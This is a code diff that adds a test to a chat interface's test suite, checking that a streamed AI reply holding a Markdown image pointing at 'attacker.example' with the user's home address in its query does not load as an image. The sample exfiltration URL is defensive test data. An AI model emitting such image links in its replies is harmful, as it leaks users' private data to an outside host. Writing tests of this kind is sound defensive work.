@@ -4,6 +4,7 @@ import { describe, expect, it, vi } from 'vitest';
 import { renderWithProviders } from '@/test/renderWithProviders';
 
 import { Chat } from './Chat';
+import { Channel, FrameEncoder } from './utils';
 
 vi.mock('@/components/ModelSelector', () => ({
   ModelSelector: () => <div data-testid="model-selector" />,
@@ -48,6 +49,31 @@ describe('Chat', () => {
     fireEvent.keyDown(textarea, { key: 'Enter' });
 
     await waitFor(() => expect(getByText('what is up')).toBeInTheDocument());
+  });
+
+  it('never loads a remote image while a reply streams in', async () => {
+    // The live reply is painted by the streaming renderer, not by Markdown, so
+    // Markdown's own image rule never saw it. The URL arrives split across
+    // frames, the way a model's tokens do.
+    const src = 'https://attacker.example/log?d=home+address';
+    const reply = `Here you go. ![](${src})`;
+    const encoder = new FrameEncoder();
+    const readable = new ReadableStream<Uint8Array>({
+      start(controller) {
+        for (const piece of [reply.slice(0, 20), reply.slice(20, 40), reply.slice(40)]) {
+          controller.enqueue(encoder.encodeFrame(Channel.TEXT, piece));
+        }
+
+        controller.close();
+      },
+    });
+
+    const { container } = renderWithProviders(
+      <Chat messages={[{ role: 'user', content: 'where do I live?' }]} readable={readable} />,
+    );
+
+    await waitFor(() => expect(container.querySelector('a[data-remote-image]')).toHaveAttribute('href', src));
+    expect(container.querySelector('img')).toBeNull();
   });
 
   it('submits a typed message through ChatInput', async () => {
